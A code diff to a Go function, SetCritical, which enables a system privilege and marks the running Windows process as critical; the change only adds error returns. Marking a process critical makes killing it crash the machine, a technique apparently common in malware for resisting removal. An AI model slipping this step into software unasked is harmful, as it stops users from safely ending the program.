@@ -1,19 +1,20 @@
 package funcs
 
 import (
+	"errors"
 	"unsafe"
 
 	"requiem/store"
 )
 
-func SetCritical(critical bool) bool {
+func SetCritical(critical bool) (bool, error) {
 	if !store.IsAdmin {
-		return false
+		return false, errors.New("administrator privileges are required to do this")
 	}
 
 	var old int32
 
-	ret, _, _ := store.AdjustPrivilege.Call(
+	ret, _, err := store.AdjustPrivilege.Call(
 		uintptr(20),
 		uintptr(1),
 		uintptr(0),
@@ -21,14 +22,14 @@ func SetCritical(critical bool) bool {
 	)
 
 	if ret != 0 {
-		return false
+		return false, err
 	}
 
 	if critical {
-		ret, _, _ = store.SetCritical.Call(uintptr(1), 0, 0)
+		ret, _, err = store.SetCritical.Call(uintptr(1), 0, 0)
 	} else {
-		ret, _, _ = store.SetCritical.Call(uintptr(0), 0, 0)
+		ret, _, err = store.SetCritical.Call(uintptr(0), 0, 0)
 	}
 
-	return ret == 0
+	return ret == 0, err
 }
